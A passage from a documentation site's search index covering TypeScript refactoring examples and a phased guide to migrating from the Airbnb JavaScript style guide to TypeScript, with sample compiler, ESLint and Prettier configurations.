deployment stages</li> <li>\u2705 Better error context</li> </ul>","tags":["typescript","refactoring","best-practices","react","nodejs"]},{"location":"09_refactoring/typescript_refactoring/#use-modern-es6-features","title":"Use Modern ES6+ Features","text":"","tags":["typescript","refactoring","best-practices","react","nodejs"]},{"location":"09_refactoring/typescript_refactoring/#problem-legacy-javascript-patterns","title":"Problem: Legacy JavaScript patterns","text":"<p>Before:</p> <pre><code>var UserService = (function() {\n  var apiUrl = 'https://api.example.com';\n  var cache = {};\n\n  function fetchUser(userId) {\n    if (cache[userId]) {\n      return Promise.resolve(cache[userId]);\n    }\n\n    return fetch(apiUrl + '/users/' + userId)\n      .then(function(response) {\n        return response.json();\n      })\n      .then(function(user) {\n        cache[userId] = user;\n        return user;\n      });\n  }\n\n  function formatUserName(user) {\n    return user.firstName + ' ' + user.lastName;\n  }\n\n  function getUsersByRole(users, role) {\n    var filtered = [];\n    for (var i = 0; i &lt; users.length; i++) {\n      if (users[i].role === role) {\n        filtered.push(users[i]);\n      }\n    }\n    return filtered;\n  }\n\n  return {\n    fetchUser: fetchUser,\n    formatUserName: formatUserName,\n    getUsersByRole: getUsersByRole\n  };\n})();\n</code></pre> <p>After:</p> <pre><code>interface User {\n  id: string;\n  firstName: string;\n  lastName: string;\n  role: 'admin' | 'user' | 'guest';\n  email: string;\n}\n\nclass UserService {\n  private readonly apiUrl = 'https://api.example.com';\n  private readonly cache = new Map&lt;string, User&gt;();\n\n  async fetchUser(userId: string): Promise&lt;User&gt; {\n    // Check cache first\n    const cached = this.cache.get(userId);\n    if (cached) {\n      return cached;\n    }\n\n    // Fetch from API\n    const response = await fetch(`${this.apiUrl}/users/${userId}`);\n    if (!response.ok) {\n      throw new Error(`Failed to fetch user: ${response.status}`);\n    }\n\n    const user: User = await response.json();\n    this.cache.set(userId, user);\n\n    return user;\n  }\n\n  formatUserName(user: User): string {\n    return `${user.firstName} ${user.lastName}`;\n  }\n\n  getUsersByRole(users: User[], role: User['role']): User[] {\n    return users.filter(user =&gt; user.role === role);\n  }\n\n  clearCache(): void {\n    this.cache.clear();\n  }\n\n  getCacheSize(): number {\n    return this.cache.size;\n  }\n}\n\n// Usage\nconst userService = new UserService();\nconst user = await userService.fetchUser('123');\nconst fullName = userService.formatUserName(user);\nconst admins = userService.getUsersByRole([user], 'admin');\n</code></pre> <p>Improvements:</p> <ul> <li>\u2705 ES6 class instead of IIFE</li> <li>\u2705 Async/await instead of promise chains</li> <li>\u2705 Template literals instead of string concatenation</li> <li>\u2705 Array methods (filter) instead of loops</li> <li>\u2705 Map instead of plain object for cache</li> <li>\u2705 Proper TypeScript types throughout</li> <li>\u2705 Private fields with readonly where appropriate</li> </ul>","tags":["typescript","refactoring","best-practices","react","nodejs"]},{"location":"09_refactoring/typescript_refactoring/#apply-functional-programming-patterns","title":"Apply Functional Programming Patterns","text":"","tags":["typescript","refactoring","best-practices","react","nodejs"]},{"location":"09_refactoring/typescript_refactoring/#problem-imperative-mutation-heavy-code","title":"Problem: Imperative, mutation-heavy code","text":"<p>Before:</p> <pre><code>interface Product {\n  id: string;\n  name: string;\n  price: number;\n  category: string;\n  inStock: boolean;\n}\n\nfunction processProducts(products: Product[]) {\n  // Apply discount\n  for (let i = 0; i &lt; products.length; i++) {\n    if (products[i].category === 'electronics') {\n      products[i].price = products[i].price * 0.9;\n    }\n  }\n\n  // Filter in-stock\n  let inStock = [];\n  for (let i = 0; i &lt; products.length; i++) {\n    if (products[i].inStock) {\n      inStock.push(products[i]);\n    }\n  }\n\n  // Sort by price\n  for (let i = 0; i &lt; inStock.length - 1; i++) {\n    for (let j = 0; j &lt; inStock.length - i - 1; j++) {\n      if (inStock[j].price &gt; inStock[j + 1].price) {\n        let temp = inStock[j];\n        inStock[j] = inStock[j + 1];\n        inStock[j + 1] = temp;\n      }\n    }\n  }\n\n  // Group by category\n  let grouped: any = {};\n  for (let i = 0; i &lt; inStock.length; i++) {\n    let category = inStock[i].category;\n    if (!grouped[category]) {\n      grouped[category] = [];\n    }\n    grouped[category].push(inStock[i]);\n  }\n\n  return grouped;\n}\n</code></pre> <p>After:</p> <pre><code>interface Product {\n  id: string;\n  name: string;\n  price: number;\n  category: string;\n  inStock: boolean;\n}\n\ninterface DiscountedProduct extends Product {\n  originalPrice: number;\n  discountApplied: boolean;\n}\n\n// Pure function: Apply discount without mutation\nfunction applyDiscount(product: Product): DiscountedProduct {\n  const ELECTRONICS_DISCOUNT = 0.10;\n  const isElectronics = product.category === 'electronics';\n\n  return {\n    ...product,\n    originalPrice: product.price,\n    price: isElectronics ? product.price * (1 - ELECTRONICS_DISCOUNT) : product.price,\n    discountApplied: isElectronics\n  };\n}\n\n// Pure function: Filter in-stock products\nconst isInStock = (product: Product): boolean =&gt; product.inStock;\n\n// Pure function: Sort by price (ascending)\nconst byPrice = (a: Product, b: Product): number =&gt; a.price - b.price;\n\n// Pure function: Group by category\nfunction groupByCategory&lt;T extends Product&gt;(\n  products: T[]\n): Map&lt;string, T[]&gt; {\n  return products.reduce((groups, product) =&gt; {\n    const category = product.category;\n    const existing = groups.get(category) ?? [];\n    groups.set(category, [...existing, product]);\n    return groups;\n  }, new Map&lt;string, T[]&gt;());\n}\n\n// Compose the pipeline\nfunction processProducts(products: Product[]): Map&lt;string, DiscountedProduct[]&gt; {\n  return groupByCategory(\n    products\n      .map(applyDiscount)\n      .filter(isInStock)\n      .sort(byPrice)\n  );\n}\n\n// Alternative: Pipe pattern for clarity\nfunction pipe&lt;T&gt;(...fns: Array&lt;(arg: T) =&gt; T&gt;) {\n  return (value: T) =&gt; fns.reduce((acc, fn) =&gt; fn(acc), value);\n}\n\nconst processProductsPipe = (products: Product[]) =&gt;\n  pipe(\n    (p: Product[]) =&gt; p.map(applyDiscount),\n    (p: DiscountedProduct[]) =&gt; p.filter(isInStock),\n    (p: DiscountedProduct[]) =&gt; p.sort(byPrice),\n    (p: DiscountedProduct[]) =&gt; groupByCategory(p)\n  )(products);\n</code></pre> <p>Improvements:</p> <ul> <li>\u2705 Pure functions (no mutations)</li> <li>\u2705 Immutable data transformations</li> <li>\u2705 Composable, reusable functions</li> <li>\u2705 Declarative style</li> <li>\u2705 Type-safe generics</li> <li>\u2705 Easy to test each function independently</li> </ul>","tags":["typescript","refactoring","best-practices","react","nodejs"]},{"location":"09_refactoring/typescript_refactoring/#resources","title":"Resources","text":"","tags":["typescript","refactoring","best-practices","react","nodejs"]},{"location":"09_refactoring/typescript_refactoring/#tools","title":"Tools","text":"<ul> <li>TypeScript Compiler (<code>tsc</code>): Type checking</li> <li>ESLint: Code linting with TypeScript rules</li> <li>Prettier: Code formatting</li> <li>ts-node: TypeScript execution</li> <li>TypeDoc: Documentation generation</li> </ul>","tags":["typescript","refactoring","best-practices","react","nodejs"]},{"location":"09_refactoring/typescript_refactoring/#related-documentation","title":"Related Documentation","text":"<ul> <li>TypeScript Style Guide</li> <li>TypeScript Library Example</li> <li>Testing Strategies</li> </ul> <p>Version: 1.0.0 Last Updated: 2025-12-06</p>","tags":["typescript","refactoring","best-practices","react","nodejs"]},{"location":"10_migration_guides/from_airbnb/","title":"Migrating from Airbnb Style Guide to Dukes Engineering Style Guide","text":"","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#overview","title":"Overview","text":"<p>This guide helps JavaScript and React developers transition from the Airbnb JavaScript Style Guide to the Dukes Engineering Style Guide with a focus on TypeScript adoption. While Airbnb's guide is excellent for JavaScript, our guide adds TypeScript type safety, DevOps-oriented enhancements, and infrastructure automation requirements.</p>","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#what-this-guide-covers","title":"What This Guide Covers","text":"<ul> <li>JavaScript \u2192 TypeScript migration path</li> <li>Airbnb conventions vs. Dukes Engineering standards</li> <li>Type safety and static analysis requirements</li> <li>Modern tooling updates (ESLint, Prettier, TypeScript)</li> <li>React best practices alignment</li> <li>Step-by-step migration checklist</li> </ul>","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#who-should-use-this-guide","title":"Who Should Use This Guide","text":"<ul> <li>Teams currently following Airbnb JavaScript/React Style Guide</li> <li>JavaScript projects adopting TypeScript</li> <li>React applications transitioning to type-safe development</li> <li>Organizations standardizing on TypeScript for DevOps tooling</li> </ul>","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#quick-compatibility-summary","title":"Quick Compatibility Summary","text":"<pre><code>graph LR\n    Airbnb[Airbnb JavaScript&lt;br/&gt;Style Guide] --&gt; JavaScript[JavaScript Patterns&lt;br/&gt;Mostly Compatible]\n    Airbnb --&gt; TypeScript[TypeScript Migration&lt;br/&gt;Type Safety Required]\n    Airbnb --&gt; DevOps[DevOps Enhancements&lt;br/&gt;Tooling &amp; Standards]\n\n    JavaScript --&gt; Migration[Migration Path]\n    TypeScript --&gt; Migration\n    DevOps --&gt; Migration\n\n    Migration --&gt; Dukes[Dukes Engineering&lt;br/&gt;TypeScript Guide]\n\n    style JavaScript fill:#e8f5e9\n    style TypeScript fill:#fff3e0\n    style DevOps fill:#f3e5f5\n    style Dukes fill:#e3f2fd</code></pre>","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#what-stays-the-same","title":"What Stays the Same","text":"<p>Both Airbnb and Dukes Engineering guides share these JavaScript best practices:</p>","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#core-principles","title":"Core Principles \u2705","text":"Aspect Airbnb Our Guide Prefer const \u2705 \u2705 Same No var \u2705 \u2705 Same Arrow functions \u2705 \u2705 Same Template literals \u2705 \u2705 Same Destructuring \u2705 \u2705 Same Spread operator \u2705 \u2705 Same Object shorthand \u2705 \u2705 Same Array methods \u2705 \u2705 Same (map, filter, reduce) Async/await \u2705 \u2705 Same (preferred over promises) Module imports \u2705 \u2705 Same (ES6 modules)","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#naming-conventions","title":"Naming Conventions \u2705","text":"Element Convention Airbnb Our Guide Variables <code>camelCase</code> \u2705 \u2705 Same Constants <code>UPPER_SNAKE_CASE</code> \u2705 \u2705 Same Functions <code>camelCase</code> \u2705 \u2705 Same Classes <code>PascalCase</code> \u2705 \u2705 Same React Components <code>PascalCase</code> \u2705 \u2705 Same Private (convention) <code>_leadingUnderscore</code> \u2705 \u2705 Same Files <code>camelCase</code> or <code>PascalCase</code> \u2705 \u2705 Same","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#code-style","title":"Code Style \u2705","text":"<ul> <li>Indentation: 2 spaces (both guides)</li> <li>Semicolons: Required (both guides)</li> <li>Quotes: Single quotes for strings (both guides)</li> <li>Trailing commas: Encouraged (both guides)</li> <li>Max line length: 100 characters (both guides)</li> </ul>","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#what-changes-javascript-typescript","title":"What Changes: JavaScript \u2192 TypeScript","text":"","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#1-type-annotations-optional-required","title":"1. Type Annotations: Optional \u2192 Required","text":"<p>Airbnb (JavaScript): No type system (relies on JSDoc comments) Our Guide (TypeScript): Type annotations required for all functions, variables, and parameters</p> <p>Why: TypeScript provides compile-time type checking, prevents runtime errors, improves IDE support, and serves as inline documentation for DevOps automation code.</p> <p>Migration:</p> <pre><code>// Airbnb JavaScript - JSDoc for types\n/**\n * Calculate total price with tax\n * @param {number} price - Base price\n * @param {number} taxRate - Tax rate (0-1)\n * @returns {number} Total price\n */\nfunction calculateTotal(price, taxRate) {\n  return price * (1 + taxRate);\n}\n\n// Our Guide TypeScript - Type annotations\nfunction calculateTotal(price: number, taxRate: number): number {\n  return price * (1 + taxRate);\n}\n</code></pre> <p>Action Required:</p> <ul> <li>Add TypeScript type annotations to all functions</li> <li>Replace JSDoc types with TypeScript types</li> <li>Define interfaces for complex objects</li> <li>Use type aliases for union types</li> </ul>","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#2-interface-definitions-none-required","title":"2. Interface Definitions: None \u2192 Required","text":"<p>Airbnb (JavaScript): PropTypes for React, no formal interfaces Our Guide (TypeScript): Interfaces/types required for all data structures</p> <p>Migration:</p> <pre><code>// Airbnb JavaScript with PropTypes\nimport PropTypes from 'prop-types';\n\nfunction UserCard({ user }) {\n  return &lt;div&gt;{user.name}&lt;/div&gt;;\n}\n\nUserCard.propTypes = {\n  user: PropTypes.shape({\n    id: PropTypes.number.isRequired,\n    name: PropTypes.string.isRequired,\n    email: PropTypes.string.isRequired\n  }).isRequired\n};\n\n// Our Guide TypeScript with interfaces\ninterface User {\n  id: number;\n  name: string;\n  email: string;\n}\n\ninterface UserCardProps {\n  user: User;\n}\n\nfunction UserCard({ user }: UserCardProps): JSX.Element {\n  return &lt;div&gt;{user.name}&lt;/div&gt;;\n}\n</code></pre> <p>Action Required:</p> <ul> <li>Convert PropTypes to TypeScript interfaces</li> <li>Define interfaces for all data structures</li> <li>Use type inference where obvious</li> <li>Export interfaces for shared types</li> </ul>","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#3-react-component-types-implicit-explicit","title":"3. React Component Types: Implicit \u2192 Explicit","text":"<p>Airbnb (JavaScript): Functional components, PropTypes validation Our Guide (TypeScript): Typed functional components with React.FC or explicit types</p> <p>Migration:</p> <pre><code>// Airbnb JavaScript\nconst Button = ({ onClick, children, disabled = false }) =&gt; (\n  &lt;button onClick={onClick} disabled={disabled}&gt;\n    {children}\n  &lt;/button&gt;\n);\n\nButton.propTypes = {\n  onClick: PropTypes.func.isRequired,\n  children: PropTypes.node.isRequired,\n  disabled: PropTypes.bool\n};\n\n// Our Guide TypeScript - Option 1: Explicit types (recommended)\ninterface ButtonProps {\n  onClick: () =&gt; void;\n  children: React.ReactNode;\n  disabled?: boolean;\n}\n\nconst Button = ({ onClick, children, disabled = false }: ButtonProps): JSX.Element =&gt; (\n  &lt;button onClick={onClick} disabled={disabled}&gt;\n    {children}\n  &lt;/button&gt;\n);\n\n// Our Guide TypeScript - Option 2: React.FC (acceptable)\nconst Button: React.FC&lt;ButtonProps&gt; = ({ onClick, children, disabled = false }) =&gt; (\n  &lt;button onClick={onClick} disabled={disabled}&gt;\n    {children}\n  &lt;/button&gt;\n);\n</code></pre> <p>Action Required:</p> <ul> <li>Define prop interfaces for all components</li> <li>Remove PropTypes dependencies</li> <li>Add return type annotations</li> <li>Use optional properties (<code>?</code>) for optional props</li> </ul>","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#4-enum-usage-none-recommended","title":"4. Enum Usage: None \u2192 Recommended","text":"<p>Airbnb (JavaScript): Object constants or string literals Our Guide (TypeScript): Enums or const enums for fixed sets of values</p> <p>Migration:</p> <pre><code>// Airbnb JavaScript - Object constants\nconst UserRole = {\n  ADMIN: 'admin',\n  USER: 'user',\n  GUEST: 'guest'\n};\n\nfunction checkPermission(role) {\n  return role === UserRole.ADMIN;\n}\n\n// Our Guide TypeScript - Enums\nenum UserRole {\n  Admin = 'admin',\n  User = 'user',\n  Guest = 'guest'\n}\n\nfunction checkPermission(role: UserRole): boolean {\n  return role === UserRole.Admin;\n}\n\n// Or const enum for better tree-shaking\nconst enum UserRole {\n  Admin = 'admin',\n  User = 'user',\n  Guest = 'guest'\n}\n</code></pre> <p>Action Required:</p> <ul> <li>Convert object constants to enums</li> <li>Use const enums for better performance</li> <li>Define enum types for fixed value sets</li> </ul>","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#5-nullundefined-handling-loose-strict","title":"5. Null/Undefined Handling: Loose \u2192 Strict","text":"<p>Airbnb (JavaScript): Loose equality, runtime checks Our Guide (TypeScript): Strict null checks, union types with null/undefined</p> <p>Migration:</p> <pre><code>// Airbnb JavaScript\nfunction getUserName(user) {\n  if (!user || !user.name) {\n    return 'Anonymous';\n  }\n  return user.name;\n}\n\n// Our Guide TypeScript\ninterface User {\n  name: string;\n}\n\nfunction getUserName(user: User | null | undefined): string {\n  if (!user?.name) {\n    return 'Anonymous';\n  }\n  return user.name;\n}\n\n// Or with optional chaining and nullish coalescing\nfunction getUserName(user?: User): string {\n  return user?.name ?? 'Anonymous';\n}\n</code></pre> <p>Action Required:</p> <ul> <li>Enable <code>strictNullChecks</code> in tsconfig.json</li> <li>Use optional chaining (<code>?.</code>) and nullish coalescing (<code>??</code>)</li> <li>Explicitly type nullable values with <code>| null | undefined</code></li> <li>Handle null/undefined cases explicitly</li> </ul>","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#6-generic-types-none-used-extensively","title":"6. Generic Types: None \u2192 Used Extensively","text":"<p>Airbnb (JavaScript): No generics concept Our Guide (TypeScript): Generics for reusable, type-safe functions</p> <p>Migration:</p> <pre><code>// Airbnb JavaScript\nfunction getFirstItem(array) {\n  return array.length &gt; 0 ? array[0] : null;\n}\n\n// Our Guide TypeScript - Generics\nfunction getFirstItem&lt;T&gt;(array: T[]): T | null {\n  return array.length &gt; 0 ? array[0] : null;\n}\n\n// Usage with type inference\nconst firstNumber = getFirstItem([1, 2, 3]); // Type: number | null\nconst firstName = getFirstItem(['a', 'b']); // Type: string | null\n</code></pre> <p>Action Required:</p> <ul> <li>Add generic type parameters to reusable functions</li> <li>Use generics for containers (arrays, maps, sets)</li> <li>Define generic interfaces for flexible data structures</li> </ul>","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#tool-configuration-migration","title":"Tool Configuration Migration","text":"","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#from-javascript-to-typescript-build-tools","title":"From JavaScript to TypeScript Build Tools","text":"","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#remove-javascript-only-tools","title":"Remove JavaScript-only Tools","text":"<pre><code>## Uninstall PropTypes (replaced by TypeScript)\nnpm uninstall prop-types\n\n## Remove Babel if only used for type checking\nnpm uninstall @babel/preset-typescript\n</code></pre>","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#install-typescript-tooling","title":"Install TypeScript Tooling","text":"<pre><code>## Install TypeScript and related tools\nnpm install --save-dev typescript\nnpm install --save-dev @types/react @types/react-dom @types/node\nnpm install --save-dev ts-node tsx\n</code></pre>","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#typescript-configuration","title":"TypeScript Configuration","text":"<p>Create <code>tsconfig.json</code>:</p> <pre><code>{\n  \"compilerOptions\": {\n    \"target\": \"ES2020\",\n    \"lib\": [\"ES2020\", \"DOM\", \"DOM.Iterable\"],\n    \"jsx\": \"react-jsx\",\n    \"module\": \"ESNext\",\n    \"moduleResolution\": \"node\",\n    \"resolveJsonModule\": true,\n    \"allowJs\": true,\n    \"checkJs\": false,\n    \"outDir\": \"./dist\",\n    \"rootDir\": \"./src\",\n    \"strict\": true,\n    \"strictNullChecks\": true,\n    \"strictFunctionTypes\": true,\n    \"strictBindCallApply\": true,\n    \"strictPropertyInitialization\": true,\n    \"noImplicitThis\": true,\n    \"noUnusedLocals\": true,\n    \"noUnusedParameters\": true,\n    \"noImplicitReturns\": true,\n    \"noFallthroughCasesInSwitch\": true,\n    \"esModuleInterop\": true,\n    \"skipLibCheck\": true,\n    \"forceConsistentCasingInFileNames\": true\n  },\n  \"include\": [\"src\"],\n  \"exclude\": [\"node_modules\", \"dist\"]\n}\n</code></pre>","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#eslint-configuration-updates","title":"ESLint Configuration Updates","text":"","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#update-eslint-for-typescript","title":"Update ESLint for TypeScript","text":"<pre><code>## Install TypeScript ESLint\nnpm install --save-dev @typescript-eslint/parser @typescript-eslint/eslint-plugin\n</code></pre>","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#update-eslintrcjson","title":"Update <code>.eslintrc.json</code>","text":"<pre><code>{\n  \"extends\": [\n    \"airbnb\",\n    \"airbnb/hooks\",\n    \"plugin:@typescript-eslint/recommended\",\n    \"plugin:@typescript-eslint/recommended-requiring-type-checking\",\n    \"prettier\"\n  ],\n  \"parser\": \"@typescript-eslint/parser\",\n  \"parserOptions\": {\n    \"ecmaVersion\": 2020,\n    \"sourceType\": \"module\",\n    \"ecmaFeatures\": {\n      \"jsx\": true\n    },\n    \"project\": \"./tsconfig.json\"\n  },\n  \"plugins\": [\"@typescript-eslint\", \"react\", \"react-hooks\"],\n  \"rules\": {\n    \"react/jsx-filename-extension\": [1, { \"extensions\": [\".tsx\"] }],\n    \"react/prop-types\": \"off\",\n    \"@typescript-eslint/explicit-function-return-type\": \"warn\",\n    \"@typescript-eslint/no-unused-vars\": \"error\",\n    \"@typescript-eslint/no-explicit-any\": \"error\",\n    \"import/extensions\": [\n      \"error\",\n      \"ignorePackages\",\n      {\n        \"ts\": \"never\",\n        \"tsx\": \"never\"\n      }\n    ]\n  },\n  \"settings\": {\n    \"import/resolver\": {\n      \"typescript\": {}\n    }\n  }\n}\n</code></pre>","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#prettier-configuration","title":"Prettier Configuration","text":"<p>Both Airbnb and our guide work well with Prettier. Update <code>.prettierrc</code>:</p> <pre><code>{\n  \"semi\": true,\n  \"singleQuote\": true,\n  \"tabWidth\": 2,\n  \"trailingComma\": \"es5\",\n  \"printWidth\": 100,\n  \"arrowParens\": \"always\",\n  \"endOfLine\": \"lf\"\n}\n</code></pre>","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#migration-checklist","title":"Migration Checklist","text":"","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#phase-1-setup-typescript-infrastructure","title":"Phase 1: Setup TypeScript Infrastructure","text":"<ul> <li>[ ] Install TypeScript and dependencies</li> </ul> <pre><code>npm install --save-dev typescript\nnpm install --save-dev @types/react @types/react-dom @types/node\n</code></pre> <ul> <li>[ ] Create <code>tsconfig.json</code></li> <li>Enable strict mode</li> <li>Configure module resolution</li> <li> <p>Set target to ES2020+</p> </li> <li> <p>[ ] Update build scripts in <code>package.json</code></p> </li> </ul> <pre><code>{\n  \"scripts\": {\n    \"build\": \"tsc\",\n    \"dev\": \"tsx src/index.ts\",\n    \"type-check\": \"tsc --noEmit\"\n  }\n}\n</code></pre> <ul> <li>[ ] Install TypeScript ESLint</li> </ul> <pre><code>npm install --save-dev @typescript-eslint/parser @typescript-eslint/eslint-plugin\n</code></pre> <ul> <li>[ ] Update ESLint configuration</li> <li>Add TypeScript parser</li> <li>Add TypeScript plugin</li> <li>Update rules for TypeScript</li> </ul>","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#phase-2-incremental-file-migration","title":"Phase 2: Incremental File Migration","text":"<ul> <li>[ ] Rename files from .js/.jsx to .ts/.tsx</li> <li>Start with utility functions (<code>.js</code> \u2192 <code>.ts</code>)</li> <li>Then components (<code>.jsx</code> \u2192 <code>.tsx</code>)</li> <li> <p>Work from leaf modules to entry points</p> </li> <li> <p>[ ] Enable <code>allowJs</code> in tsconfig.json</p> </li> <li>Allows gradual migration</li> <li> <p>TypeScript and JavaScript can coexist</p> </li> <li> <p>[ ] Address type errors incrementally</p> </li> <li>Fix one module at a time</li> <li>Use <code>// @ts-ignore</code> sparingly for tough cases</li> <li>Create issue tracking for remaining <code>@ts-ignore</code></li> </ul>","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#phase-3-add-type-definitions","title":"Phase 3: Add Type Definitions","text":"<ul> <li>[ ] Convert PropTypes to TypeScript interfaces</li> </ul> <pre><code>// Before\nComponent.propTypes = {\n  user: PropTypes.shape({\n    id: PropTypes.number,\n    name: PropTypes.string\n  })\n};\n\n// After\ninterface User {\n  id: number;\n  name: string;\n}\n\ninterface ComponentProps {\n  user: User;\n}\n</code></pre> <ul> <li>[ ] Add explicit return types to functions</li> </ul> <pre><code>function calculateTotal(price: number, tax: number): number {\n  return price * (1 + tax);\n}\n</code></pre> <ul> <li>[ ] Define interfaces for API responses</li> </ul> <pre><code>interface ApiResponse&lt;T&gt; {\n  data: T;\n  status: number;\n  message: string;\n}\n</code></pre> <ul> <li>[ ] Create type definitions for external libraries</li> <li>Install <code>@types/*</code> packages</li> <li>Create custom <code>.d.ts</code> files if needed</li> </ul>","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#phase-4-react-component-migration","title":"Phase 4: React Component Migration","text":"<ul> <li>[ ] Update functional components with types</li> </ul> <pre><code>const Button: React.FC&lt;ButtonProps&gt; = ({ onClick, children }) =&gt; (\n  &lt;button onClick={onClick}&gt;{children}&lt;/button&gt;\n);\n</code></pre> <ul> <li>[ ] Add types to hooks</li> </ul> <pre><code>const [count, setCount] = useState&lt;number&gt;(0);\nconst ref = useRef&lt;HTMLDivElement&gt;(null);\nconst context = useContext&lt;AuthContextType&gt;(AuthContext);\n</code></pre> <ul> <li>[ ] Type event handlers</li> </ul> <pre><code>const handleClick = (event: React.MouseEvent&lt;HTMLButtonElement&gt;): void =&gt; {\n  console.log(event.currentTarget);\n};\n</code></pre> <ul> <li>[ ] Remove PropTypes dependencies</li> </ul> <pre><code>npm uninstall prop-types\n</code></pre>","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#phase-5-advanced-typescript-features","title":"Phase 5: Advanced TypeScript Features","text":"<ul> <li>[ ] Use generics for reusable components</li> </ul> <pre><code>interface ListProps&lt;T&gt; {\n  items: T[];\n  renderItem: (item: T) =&gt; React.ReactNode;\n}\n\nfunction List&lt;T&gt;({ items, renderItem }: ListProps&lt;T&gt;) {\n  return &lt;&gt;{items.map(renderItem)}&lt;/&gt;;\n}\n</code></pre> <ul> <li>[ ] Add discriminated unions for state</li> </ul> <pre><code>type LoadingState =\n  | { status: 'idle' }\n  | { status: 'loading' }\n  | { status: 'success'; data: User[] }\n  | { status: 'error'; error: string };\n</code></pre> <ul> <li>[ ] Use utility types</li> </ul> <pre><code>type PartialUser = Partial&lt;User&gt;;\ntype ReadonlyUser = Readonly&lt;User&gt;;\ntype UserKeys = keyof User;\ntype UserName = Pick&lt;User, 'name'&gt;;\n</code></pre>","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#phase-6-testing-updates","title":"Phase 6: Testing Updates","text":"<ul> <li>[ ] Install TypeScript testing types</li> </ul> <pre><code>npm install --save-dev @types/jest @types/testing-library__react\n</code></pre> <ul> <li> <p>[ ] Update test files to <code>.test.ts</code> or <code>.test.tsx</code></p> </li> <li> <p>[ ] Add types to test utilities</p> </li> </ul> <pre><code>const renderWithProviders = (\n  ui: React.ReactElement,\n  options?: RenderOptions\n): RenderResult =&gt; {\n  return render(ui, { wrapper: AllTheProviders, ...options });\n};\n</code></pre>","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#phase-7-cicd-integration","title":"Phase 7: CI/CD Integration","text":"<ul> <li>[ ] Add TypeScript check to CI pipeline</li> </ul> <pre><code>- name: Type check\n  run: npm run type-check\n</code></pre> <ul> <li>[ ] Configure TypeScript strict mode gradually</li> <li>Start with <code>strictNullChecks: true</code></li> <li>Enable <code>noImplicitAny: true</code></li> <li> <p>Eventually enable all strict flags</p> </li> <li> <p>[ ] Add type coverage tracking</p> </li> </ul> <pre><code>npx type-coverage --at-least 95\n</code></pre>","tags":["migration","airbnb-style-guide","javascript","typescript","react","style-guide","upgrade","transition"]},{"location":"10_migration_guides/from_airbnb/#phase-8-documentation-and-training","title":"Phase 8: Documentation and Training","text":"<ul> <li>[ ] Update README with TypeScript instructions</li> <li>Document type-checking commands</li> <li> <p>Explain tsconfig.json settings</p> </li> <li> <p>[ ] Create TypeScript coding guidelines</p> </li> <li>When to use interfaces vs types</li> <li>Generic type naming conventions</li> <li> <p>Any vs unknown usage</p> </li> <li> <p>[ ] Team training on TypeScript</p> </li> <li>Share this migration guide</li> <li>Conduct TypeScript workshop</li> <li>Set up pair programming for migration</li> 